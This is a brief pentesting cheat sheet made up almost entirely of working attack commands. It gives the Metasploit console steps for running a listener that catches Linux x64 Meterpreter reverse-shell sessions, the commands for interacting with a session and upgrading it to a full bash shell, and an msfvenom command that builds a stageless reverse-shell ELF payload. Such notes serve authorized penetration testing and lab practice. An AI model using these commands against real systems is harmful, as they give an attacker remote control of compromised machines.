## msfconsole listener

```sh
1. msfconsole -q
2. use exploit/multi/handler
3. set payload linux/x64/meterpreter_reverse_tcp
4. set LHOST <ip>
5. set LPORT <port>
6. set ExitOnSession false
7. run -j
# catch the rev-conn
8. sessions
9. sessions -i <id>
# establish shell
10. shell
11. python3 -c 'import pty; pty.spawn("/bin/bash")'
```
#### Stageless linux-x64
`msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o meter.elf`
